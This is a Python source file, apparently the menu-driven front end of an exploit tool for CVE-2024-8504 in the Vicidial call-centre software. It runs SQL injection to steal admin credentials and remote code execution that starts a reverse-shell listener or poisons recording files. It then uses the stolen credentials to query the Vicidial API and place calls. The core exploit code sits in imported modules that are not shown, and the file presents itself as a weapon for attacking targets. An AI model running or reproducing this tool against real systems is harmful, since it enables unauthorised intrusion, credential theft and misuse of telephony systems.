import colorama
from colorama import Fore, Style
import sys
from sqli import ExploitSQLI
from rce import ExploitRCE
from api import VicidialAPI

# Global variable to store the API instance once credentials are retrieved
api_instance = None

def print_banner():
    banner = f"""
    =============================================
    |           EXPLOIT CVE-2024-8504           |
    |        Discovered by KoreLogic            |
    |    SQLi and RCE Exploit by HaVoK          |
    |    Choose your weapon: SQLi or RCE        |
    =============================================
    """
    print(Fore.CYAN + Style.BRIGHT + banner + Style.RESET_ALL)


def main_menu():
    print(Fore.YELLOW + Style.BRIGHT + "Select an operation:")
    print(Fore.GREEN + "[1] SQL Injection (SQLi)")
    print(Fore.BLUE + "[2] Remote Code Execution (RCE)")
    print(Fore.MAGENTA + "[3] Use Vicidial API (after credentials are retrieved)")
    print(Fore.RED + "[0] Exit" + Style.RESET_ALL)


def handle_choice():
    choice = input(Fore.MAGENTA + Style.BRIGHT + "Enter your choice: " + Style.RESET_ALL)
    if choice == '1':
        sqli()
    elif choice == '2':
        rce()
    elif choice == '3':
        if api_instance:
            api_menu()
        else:
            print(Fore.RED + "No API instance available. Retrieve admin credentials first via SQLi or RCE." + Style.RESET_ALL)
    elif choice == '0':
        print(Fore.RED + "Exiting... Bye!" + Style.RESET_ALL)
        sys.exit(0)
    else:
        print(Fore.RED + "Invalid choice. Try again." + Style.RESET_ALL)


def sqli():
    global api_instance  # To use the VicidialAPI instance globally
    print(Fore.GREEN + "SQLi Selected. Proceeding with SQL Injection..." + Style.RESET_ALL)

    # Initialize the ExploitSQLI class
    exploit = ExploitSQLI()

    # Run the SQL Injection exploit
    exploit.run()

    # If credentials were retrieved, save them for API usage
    if exploit.username and exploit.password:
        api_instance = VicidialAPI(exploit.TARGET_URL, exploit.username, exploit.password)
        print(Fore.GREEN + f"Admin credentials retrieved!\nUsername: {exploit.username}\nPassword: {exploit.password}\nYou can now use the Vicidial API." + Style.RESET_ALL)
    else:
        print(Fore.RED + "Failed to retrieve admin credentials. SQLi unsuccessful." + Style.RESET_ALL)


def rce():
    global api_instance
    print(Fore.BLUE + "RCE Selected. Proceeding with Remote Code Execution..." + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + "\nSelect RCE Action:")
    print(Fore.GREEN + "[1] Launch Listener and Execute Reverse Shell")
    print(Fore.BLUE + "[2] Execute Command without Listener")
    print(Fore.RED + "[0] Return to Main Menu" + Style.RESET_ALL)

    rce_action = input(Fore.MAGENTA + Style.BRIGHT + "Enter your choice for RCE action: " + Style.RESET_ALL)

    if rce_action == '1':  # Launch listener and execute reverse shell
        url = input(Fore.CYAN + Style.BRIGHT + "Enter target URL: " + Style.RESET_ALL)
        whost = input(Fore.CYAN + Style.BRIGHT + "Enter webserver host: " + Style.RESET_ALL)
        wport = input(Fore.CYAN + Style.BRIGHT + "Enter webserver port: " + Style.RESET_ALL)
        lhost = input(Fore.CYAN + Style.BRIGHT + "Enter listener host: " + Style.RESET_ALL)
        lport = input(Fore.CYAN + Style.BRIGHT + "Enter listener port: " + Style.RESET_ALL)
        username = input(Fore.CYAN + Style.BRIGHT + "Enter admin username: " + Style.RESET_ALL)
        password = input(Fore.CYAN + Style.BRIGHT + "Enter admin password: " + Style.RESET_ALL)

        # Instantiate and run the ExploitRCE with listener setup
        exploit = ExploitRCE(url, whost, wport, lhost, lport, username, password)
        exploit.run()

        # Store the credentials for API use
        if username and password:
            api_instance = VicidialAPI(url, username, password)
            print(Fore.GREEN + "Admin credentials retrieved! You can now use the Vicidial API." + Style.RESET_ALL)

    elif rce_action == '2':  # Execute command without launching a listener
        url = input(Fore.CYAN + Style.BRIGHT + "Enter target URL: " + Style.RESET_ALL)
        whost = input(Fore.CYAN + Style.BRIGHT + "Enter webserver host: " + Style.RESET_ALL)
        wport = input(Fore.CYAN + Style.BRIGHT + "Enter webserver port: " + Style.RESET_ALL)
        username = input(Fore.CYAN + Style.BRIGHT + "Enter admin username: " + Style.RESET_ALL)
        password = input(Fore.CYAN + Style.BRIGHT + "Enter admin password: " + Style.RESET_ALL)

        # Instantiate ExploitRCE without listener
        exploit = ExploitRCE(url, whost, wport, None, None, username, password)
        exploit.poison_recording_files(exploit.build_requests_session())  # Execute without listener
        print(Fore.GREEN + "Poisoned recording files without launching listener." + Style.RESET_ALL)

    elif rce_action == '0':  # Return to the main menu
        return
    else:
        print(Fore.RED + "Invalid choice. Try again." + Style.RESET_ALL)

def api_menu():
    print(Fore.YELLOW + Style.BRIGHT + "\nVicidial API Menu:")
    print(Fore.GREEN + "[1] Get Server Info")
    print(Fore.BLUE + "[2] List Campaigns")
    print(Fore.CYAN + "[3] Make a Call")
    print(Fore.RED + "[0] Return to Main Menu" + Style.RESET_ALL)

    choice = input(Fore.MAGENTA + Style.BRIGHT + "Enter your choice: " + Style.RESET_ALL)
    if choice == '1':
        api_instance.get_server_info()
    elif choice == '2':
        api_instance.list_campaigns()
    elif choice == '3':
        phone_number = input(Fore.CYAN + Style.BRIGHT + "Enter phone number to call: " + Style.RESET_ALL)
        campaign_id = input(Fore.CYAN + Style.BRIGHT + "Enter campaign ID: " + Style.RESET_ALL)
        api_instance.make_call(phone_number, campaign_id)
    elif choice == '0':
        return
    else:
        print(Fore.RED + "Invalid choice. Try again." + Style.RESET_ALL)

if __name__ == "__main__":
    print_banner()
    while True:
        main_menu()
        handle_choice()
